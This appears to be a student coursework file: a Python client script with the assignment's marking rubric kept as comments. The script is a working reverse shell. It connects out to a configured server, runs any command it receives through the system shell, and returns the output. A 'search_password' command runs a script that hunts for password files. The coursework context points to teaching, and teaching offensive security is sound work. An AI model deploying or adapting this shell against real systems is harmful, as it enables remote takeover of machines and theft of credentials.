import platform
import socket
import subprocess
from shared import server_ip, server_port

def main():
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    
#     1. Connect to the server [1 Mark]
# a. Implement functionality that allows the client to initiate a connection to
# the server's IP address and port.
    client_socket.connect((server_ip, server_port))
    print("client connected to {}:{}".format(server_ip, server_port))

    while True:
#        2. Receive commands from the server [1 Mark]
# a. The client should be able to receive and interpret commands sent from
# the server.
        command = client_socket.recv(1024).decode()
        command = command.strip()
        
        if command.split(" ")[0] == 'search_password':
            try:
                output = subprocess.check_output(f"{"BASH search_password_file.sh" if platform.system() == "Windows" else "./search_password_file.sh"} {command.split(" ")[1]}", shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.stdout
       
        # If the command is "end", break the loop        
        elif command == 'end':
            break

        else:
            # 3. Execute command [1 Mark]
                # a. Implement command execution functionality using the subprocess
            # library.
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
    #             4. Capture errors or response from command and send to server [2 Marks]
    # a. The client should capture the output or any errors from the executed
    # command and send this information back to the server.
                output = e.stdout

        # Send the command output back to the client
        client_socket.send(output)

    # close connection
    client_socket.close()

if __name__ == "__main__":
    main()
